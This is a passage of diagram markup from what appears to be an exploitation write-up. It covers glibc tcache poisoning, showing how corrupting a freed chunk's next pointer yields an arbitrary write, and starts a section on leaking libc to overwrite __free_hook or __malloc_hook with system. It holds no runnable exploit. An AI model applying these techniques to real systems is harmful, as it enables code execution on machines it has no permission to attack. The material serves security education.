transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe flex-start; width: 158px; height: 1px; padding-top: 351px; margin-left: 2px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: left;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: black; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal;">Since the memory chunk returned from malloc is still in the tcache list, modifying the <font face="Lucida Console">next</font> pointer will change the next returned value from malloc.<br/><br/>Note that <font face="Lucida Console">tcache_entry</font> is stored within the user region of the chunk.</div></div></div></foreignObject><text font-size="12px" x="2" y="355" fill="black" font-family="Helvetica">Since the memory chunk ret...</text></switch></g><rect fill="#ffffff" height="100" pointer-events="all" stroke="#000000" width="160" x="0" y="481"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe flex-start; justify-content: unsafe flex-start; width: 162px; height: 100px; padding-top: 481px; margin-left: 0px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: left; width: 162px; height: 100px; overflow: hidden;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; width: 100%; height: 100%; white-space: nowrap;"><p style="margin: 4px 0px 0px ; text-align: center ; line-height: 100%"><b>tcache_perthread_struct</b></p><hr size="1"/>   char counts[]<br/><hr/>   tcache_entry *entries[]<hr/><b><div style="text-align: center"><b>0x7ffff7dcfc40</b></div></b></div></div></div></foreignObject><text font-size="12px" x="0" y="493" fill="#000000" font-family="Helvetica">tcache_perthread_struct   c...</text></switch></g><path d="M 385 681 L 493.63 681" fill="none" pointer-events="stroke" stroke="#000000" stroke-miterlimit="10"/><path d="M 498.88 681 L 491.88 684.5 L 493.63 681 L 491.88 677.5 Z" fill="#000000" pointer-events="all" stroke="#000000" stroke-miterlimit="10"/><rect fill="#ffffff" height="80" pointer-events="all" stroke="#000000" width="160" x="225" y="641"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe flex-start; justify-content: unsafe flex-start; width: 162px; height: 80px; padding-top: 641px; margin-left: 225px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: left; width: 162px; height: 80px; overflow: hidden;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; width: 100%; height: 100%; white-space: nowrap;"><p style="margin: 4px 0px 0px ; text-align: center ; line-height: 120%"><b>tcache_entry</b></p><hr/>   tcache_entry *next<hr/><b><div style="text-align: center"><b>0x603260</b></div></b></div></div></div></foreignObject><text font-size="12px" x="225" y="653" fill="#000000" font-family="Helvetica">tcache_entry   tcache_entry...</text></switch></g><rect fill="none" height="140" pointer-events="all" stroke="none" width="20" x="240" y="461"/><path d="M 260 461 L 240 461 L 240 601 L 260 601" fill="none" pointer-events="all" stroke="#000000" stroke-miterlimit="10" stroke-width="2"/><path d="M 305 556 L 305 611 L 200 611 L 200 741 L 280.4 741 L 280.37 753.83" fill="none" pointer-events="stroke" stroke="#b85450" stroke-miterlimit="10"/><path d="M 280.36 759.08 L 276.88 752.07 L 280.37 753.83 L 283.88 752.09 Z" fill="#b85450" pointer-events="all" stroke="#b85450" stroke-miterlimit="10"/><rect fill="#ffffff" height="50" pointer-events="all" stroke="#000000" width="110" x="250" y="506"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 531px; margin-left: 305px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap;">Bin<br/>1</div></div></div></foreignObject><text font-size="12px" x="305" y="535" fill="#000000" font-family="Helvetica" text-anchor="middle">Bin...</text></switch></g><rect fill="#ffffff" height="50" pointer-events="all" stroke="#000000" width="110" x="430" y="506"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 531px; margin-left: 485px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap;"><font style="font-size: 12px">Bin <br/><span style="background-color: rgb(255 , 255 , 255) ; font-family: &quot;consolas&quot; , &quot;courier new&quot; , monospace ; white-space: pre">TCACHE_MAX_BINS</span></font></div></div></div></foreignObject><text font-size="12px" x="485" y="535" fill="#000000" font-family="Helvetica" text-anchor="middle">Bin...</text></switch></g><ellipse cx="375" cy="531" fill="#ffffff" pointer-events="all" rx="5" ry="5" stroke="#000000"/><ellipse cx="395" cy="531" fill="#ffffff" pointer-events="all" rx="5" ry="5" stroke="#000000"/><ellipse cx="415" cy="531" fill="#ffffff" pointer-events="all" rx="5" ry="5" stroke="#000000"/><rect fill="none" height="140" pointer-events="all" stroke="none" width="20" x="530" y="461" transform="rotate(-180,540,531)"/><path d="M 550 461 L 530 461 L 530 601 L 550 601" fill="none" pointer-events="all" stroke="#000000" stroke-miterlimit="10" stroke-width="2" transform="rotate(-180,540,531)"/><path d="M 160 546 L 233.63 546" fill="none" pointer-events="stroke" stroke="#000000" stroke-miterlimit="10"/><path d="M 238.88 546 L 231.88 549.5 L 233.63 546 L 231.88 542.5 Z" fill="#000000" pointer-events="all" stroke="#000000" stroke-miterlimit="10"/><path d="M 385 801 L 560 801 L 560 717.37" fill="none" pointer-events="stroke" stroke="#000000" stroke-miterlimit="10"/><path d="M 560 712.12 L 563.5 719.12 L 560 717.37 L 556.5 719.12 Z" fill="#000000" pointer-events="all" stroke="#000000" stroke-miterlimit="10"/><rect fill="#ffffff" height="80" pointer-events="all" stroke="#000000" width="160" x="225" y="761"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe flex-start; justify-content: unsafe flex-start; width: 162px; height: 80px; padding-top: 761px; margin-left: 225px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: left; width: 162px; height: 80px; overflow: hidden;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; width: 100%; height: 100%; white-space: nowrap;"><p style="margin: 4px 0px 0px ; text-align: center ; line-height: 120%"><b>tcache_entry</b></p><hr/>   tcache_entry *next<hr/><b><div style="text-align: center"><b>0x603260</b></div></b></div></div></div></foreignObject><text font-size="12px" x="225" y="773" fill="#000000" font-family="Helvetica">tcache_entry   tcache_entry...</text></switch></g><path d="M 140 681 L 180 681 L 180 652.6 L 219.59 652.6" fill="none" pointer-events="stroke" stroke="#000000" stroke-miterlimit="10"/><path d="M 224.84 652.6 L 217.84 656.1 L 219.59 652.6 L 217.84 649.1 Z" fill="#000000" pointer-events="all" stroke="#000000" stroke-miterlimit="10"/><path d="M 140 681 L 180 681 L 180 772 L 218.79 771.97" fill="none" pointer-events="stroke" stroke="#000000" stroke-miterlimit="10"/><path d="M 224.04 771.96 L 217.05 775.47 L 218.79 771.97 L 217.04 768.47 Z" fill="#000000" pointer-events="all" stroke="#000000" stroke-miterlimit="10"/><rect fill="#ffffff" height="60" pointer-events="all" stroke="#000000" width="120" x="20" y="651"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 118px; height: 1px; padding-top: 681px; margin-left: 21px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal;">void* malloc()<br/>(malloc 1)</div></div></div></foreignObject><text font-size="12px" x="80" y="685" fill="#000000" font-family="Helvetica" text-anchor="middle">void* malloc()...</text></switch></g><rect fill="none" height="60" pointer-events="all" stroke="#000000" width="120" x="500" y="651"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 118px; height: 1px; padding-top: 681px; margin-left: 501px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: black; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal;"><b>*0xFFFF12AD</b></div></div></div></foreignObject><text font-size="12px" x="560" y="685" fill="black" font-family="Helvetica" text-anchor="middle">*0xFFFF12AD</text></switch></g><rect fill="none" height="100" pointer-events="all" stroke="none" width="160" x="0" y="741"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe flex-start; width: 158px; height: 1px; padding-top: 791px; margin-left: 2px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: left;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: black; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal;">If we can write data to the malloc region, we can set the address we want to overwrite.<br/><br/>The next malloc will<br/>return <font style="font-size: 11px" face="Lucida Console">0x603260</font>.</div></div></div></foreignObject><text font-size="12px" x="2" y="795" fill="black" font-family="Helvetica">If we can write data to th...</text></switch></g><rect fill="#ffffff" height="100" pointer-events="all" stroke="#000000" width="160" x="0" y="941"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe flex-start; justify-content: unsafe flex-start; width: 162px; height: 100px; padding-top: 941px; margin-left: 0px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: left; width: 162px; height: 100px; overflow: hidden;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; width: 100%; height: 100%; white-space: nowrap;"><p style="margin: 4px 0px 0px ; text-align: center ; line-height: 100%"><b>tcache_perthread_struct</b></p><hr size="1"/>   char counts[]<br/><hr/>   tcache_entry *entries[]<hr/><b><div style="text-align: center"><b>0x7ffff7dcfc40</b></div></b></div></div></div></foreignObject><text font-size="12px" x="0" y="953" fill="#000000" font-family="Helvetica">tcache_perthread_struct   c...</text></switch></g><path d="M 385 1141 L 493.63 1141" fill="none" pointer-events="stroke" stroke="#000000" stroke-miterlimit="10"/><path d="M 498.88 1141 L 491.88 1144.5 L 493.63 1141 L 491.88 1137.5 Z" fill="#000000" pointer-events="all" stroke="#000000" stroke-miterlimit="10"/><rect fill="#ffffff" height="80" pointer-events="all" stroke="#000000" width="160" x="225" y="1101"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe flex-start; justify-content: unsafe flex-start; width: 162px; height: 80px; padding-top: 1101px; margin-left: 225px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: left; width: 162px; height: 80px; overflow: hidden;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; width: 100%; height: 100%; white-space: nowrap;"><p style="margin: 4px 0px 0px ; text-align: center ; line-height: 120%"><b>tcache_entry</b></p><hr/>   tcache_entry *next<hr/><b><div style="text-align: center"><b>0x603260</b></div></b></div></div></div></foreignObject><text font-size="12px" x="225" y="1113" fill="#000000" font-family="Helvetica">tcache_entry   tcache_entry...</text></switch></g><rect fill="none" height="140" pointer-events="all" stroke="none" width="20" x="240" y="921"/><path d="M 260 921 L 240 921 L 240 1061 L 260 1061" fill="none" pointer-events="all" stroke="#000000" stroke-miterlimit="10" stroke-width="2"/><path d="M 305 1016 L 305 1081 L 560 1081 L 560 1104.63" fill="none" pointer-events="stroke" stroke="#b85450" stroke-miterlimit="10"/><path d="M 560 1109.88 L 556.5 1102.88 L 560 1104.63 L 563.5 1102.88 Z" fill="#b85450" pointer-events="all" stroke="#b85450" stroke-miterlimit="10"/><rect fill="#ffffff" height="50" pointer-events="all" stroke="#000000" width="110" x="250" y="966"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 991px; margin-left: 305px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap;">Bin<br/>1</div></div></div></foreignObject><text font-size="12px" x="305" y="995" fill="#000000" font-family="Helvetica" text-anchor="middle">Bin...</text></switch></g><rect fill="#ffffff" height="50" pointer-events="all" stroke="#000000" width="110" x="430" y="966"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 991px; margin-left: 485px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap;"><font style="font-size: 12px">Bin <br/><span style="background-color: rgb(255 , 255 , 255) ; font-family: &quot;consolas&quot; , &quot;courier new&quot; , monospace ; white-space: pre">TCACHE_MAX_BINS</span></font></div></div></div></foreignObject><text font-size="12px" x="485" y="995" fill="#000000" font-family="Helvetica" text-anchor="middle">Bin...</text></switch></g><ellipse cx="375" cy="991" fill="#ffffff" pointer-events="all" rx="5" ry="5" stroke="#000000"/><ellipse cx="395" cy="991" fill="#ffffff" pointer-events="all" rx="5" ry="5" stroke="#000000"/><ellipse cx="415" cy="991" fill="#ffffff" pointer-events="all" rx="5" ry="5" stroke="#000000"/><rect fill="none" height="140" pointer-events="all" stroke="none" width="20" x="530" y="921" transform="rotate(-180,540,991)"/><path d="M 550 921 L 530 921 L 530 1061 L 550 1061" fill="none" pointer-events="all" stroke="#000000" stroke-miterlimit="10" stroke-width="2" transform="rotate(-180,540,991)"/><path d="M 160 1006 L 233.63 1006" fill="none" pointer-events="stroke" stroke="#000000" stroke-miterlimit="10"/><path d="M 238.88 1006 L 231.88 1009.5 L 233.63 1006 L 231.88 1002.5 Z" fill="#000000" pointer-events="all" stroke="#000000" stroke-miterlimit="10"/><path d="M 385 1261 L 560 1261 L 560 1177.37" fill="none" pointer-events="stroke" stroke="#000000" stroke-miterlimit="10"/><path d="M 560 1172.12 L 563.5 1179.12 L 560 1177.37 L 556.5 1179.12 Z" fill="#000000" pointer-events="all" stroke="#000000" stroke-miterlimit="10"/><rect fill="#ffffff" height="80" pointer-events="all" stroke="#000000" width="160" x="225" y="1221"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe flex-start; justify-content: unsafe flex-start; width: 162px; height: 80px; padding-top: 1221px; margin-left: 225px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: left; width: 162px; height: 80px; overflow: hidden;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; width: 100%; height: 100%; white-space: nowrap;"><p style="margin: 4px 0px 0px ; text-align: center ; line-height: 120%"><b>tcache_entry</b></p><hr/>   tcache_entry *next<hr/><b><div style="text-align: center"><b>0x603260</b></div></b></div></div></div></foreignObject><text font-size="12px" x="225" y="1233" fill="#000000" font-family="Helvetica">tcache_entry   tcache_entry...</text></switch></g><path d="M 140 1101 L 180 1101 L 180 1112.6 L 219.59 1112.6" fill="none" pointer-events="stroke" stroke="#000000" stroke-miterlimit="10"/><path d="M 224.84 1112.6 L 217.84 1116.1 L 219.59 1112.6 L 217.84 1109.1 Z" fill="#000000" pointer-events="all" stroke="#000000" stroke-miterlimit="10"/><path d="M 140 1101 L 180 1101 L 180 1232 L 218.79 1231.97" fill="none" pointer-events="stroke" stroke="#000000" stroke-miterlimit="10"/><path d="M 224.04 1231.96 L 217.05 1235.47 L 218.79 1231.97 L 217.04 1228.47 Z" fill="#000000" pointer-events="all" stroke="#000000" stroke-miterlimit="10"/><rect fill="#ffffff" height="60" pointer-events="all" stroke="#000000" width="120" x="20" y="1071"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 118px; height: 1px; padding-top: 1101px; margin-left: 21px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal;">void* malloc()<br/>(malloc 1)</div></div></div></foreignObject><text font-size="12px" x="80" y="1105" fill="#000000" font-family="Helvetica" text-anchor="middle">void* malloc()...</text></switch></g><rect fill="none" height="60" pointer-events="all" stroke="#000000" width="120" x="500" y="1111"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 118px; height: 1px; padding-top: 1141px; margin-left: 501px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: black; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal;"><b>*0xFFFF12AD</b></div></div></div></foreignObject><text font-size="12px" x="560" y="1145" fill="black" font-family="Helvetica" text-anchor="middle">*0xFFFF12AD</text></switch></g><rect fill="#ffffff" height="60" pointer-events="all" stroke="#000000" width="120" x="20" y="1141"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 118px; height: 1px; padding-top: 1171px; margin-left: 21px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal;">void* malloc()<br/>(malloc 2)</div></div></div></foreignObject><text font-size="12px" x="80" y="1175" fill="#000000" font-family="Helvetica" text-anchor="middle">void* malloc()...</text></switch></g><path d="M 180 1171 L 140 1171" fill="none" pointer-events="stroke" stroke="#000000" stroke-miterlimit="10"/><rect fill="none" height="40" pointer-events="all" stroke="none" width="160" x="0" y="1221"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe flex-start; width: 158px; height: 1px; padding-top: 1241px; margin-left: 2px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: left;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: black; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal;">Now the next malloc will return <span style="text-align: center"><font style="font-size: 11px" face="Lucida Console">0xFFFF12AD.</font></span></div></div></div></foreignObject><text font-size="12px" x="2" y="1245" fill="black" font-family="Helvetica">Now the next malloc will r...</text></switch></g><path d="M 140 1331 L 560 1331 L 560 1177.37" fill="none" pointer-events="stroke" stroke="#000000" stroke-miterlimit="10"/><path d="M 560 1172.12 L 563.5 1179.12 L 560 1177.37 L 556.5 1179.12 Z" fill="#000000" pointer-events="all" stroke="#000000" stroke-miterlimit="10"/><rect fill="#ffffff" height="60" pointer-events="all" stroke="#000000" width="120" x="20" y="1301"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 118px; height: 1px; padding-top: 1331px; margin-left: 21px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal;">void* malloc()<br/>(malloc 3)</div></div></div></foreignObject><text font-size="12px" x="80" y="1335" fill="#000000" font-family="Helvetica" text-anchor="middle">void* malloc()...</text></switch></g><rect fill="none" height="40" pointer-events="all" stroke="none" width="160" x="0" y="1381"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe flex-start; width: 158px; height: 1px; padding-top: 1401px; margin-left: 2px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: left;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: black; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal;">Now we have an arbitrary write.</div></div></div></foreignObject><text font-size="12px" x="2" y="1405" fill="black" font-family="Helvetica">Now we have an arbitrary w...</text></switch></g></g><switch><g requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"/><a target="_blank" transform="translate(0,-5)" xlink:href="https://desk.draw.io/support/solutions/articles/16000042487"><text font-size="10px" x="50%" y="100%" text-anchor="middle">Viewer does not support full SVG 1.1</text></a></switch></svg><h2 id="leaking-libc">Leaking libc</h2><p>Even with the arbitrary write, we don't have anything to write to. Leaking libc will allow us to overwrite <code>__free_hook</code> or <code>__malloc_hook</code> with a call to system.</p><p>The internal representation of a free <code>chunk</code> is something similar to:</p> <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"> <svg height="258px" version="1.1" viewBox="-0.5 -0.5 581 258" width="581px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><defs/><g><rect fill="#ffffff" height="240" pointer-events="all" stroke="#000000" width="320" x="140" y="16" stroke-dasharray="3 3"/><path d="M 180 16 L 180 6" fill="none" pointer-events="stroke" stroke="#000000" stroke-miterlimit="10"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 6px; margin-left: 200px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 11px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; background-color: #ffffff; white-space: nowrap;">2</div></div></div></foreignObject><text font-size="11px" x="200" y="9" fill="#000000" font-family="Helvetica" text-anchor="middle">2</text></switch></g><path d="M 220 16 L 220 6" fill="none" pointer-events="stroke" stroke="#000000" stroke-miterlimit="10"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 6px; margin-left: 240px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 11px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; background-color: #ffffff; white-space: nowrap;">3</div></div></div></foreignObject><text font-size="11px" x="240" y="9" fill="#000000" font-family="Helvetica" text-anchor="middle">3</text></switch></g><path d="M 260 16 L 260 6" fill="none" pointer-events="stroke" stroke="#000000" stroke-miterlimit="10"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 6px; margin-left: 280px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 11px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; background-color: #ffffff; white-space: nowrap;">4</div></div></div></foreignObject><text font-size="11px" x="280" y="9" fill="#000000" font-family="Helvetica" text-anchor="middle">4</text></switch></g><path d="M 300 16 L 299.86 6" fill="none" pointer-events="stroke" stroke="#000000" stroke-miterlimit="10"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 6px; margin-left: 320px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 11px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; background-color: #ffffff; white-space: nowrap;">5</div></div></div></foreignObject><text font-size="11px" x="320" y="9" fill="#000000" font-family="Helvetica" text-anchor="middle">5</text></switch></g><path d="M 340 16 L 340 6" fill="none" pointer-events="stroke" stroke="#000000" stroke-miterlimit="10"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 6px; margin-left: 360px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 11px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; background-color: #ffffff; white-space: nowrap;">6</div></div></div></foreignObject><text font-size="11px" x="360" y="9" fill="#000000" font-family="Helvetica" text-anchor="middle">6</text></switch></g><path d="M 380 16 L 380 6" fill="none" pointer-events="stroke" stroke="#000000" stroke-miterlimit="10"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 6px; margin-left: 400px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 11px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; background-color: #ffffff; white-space: nowrap;">7</div></div></div></foreignObject><text font-size="11px" x="400" y="9" fill="#000000" font-family="Helvetica" text-anchor="middle">7</text></switch></g><path d="M 420 16 L 420 6" fill="none" pointer-events="stroke" stroke="#000000" stroke-miterlimit="10"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 6px; margin-left: 440px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 11px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; background-color: #ffffff; white-space: 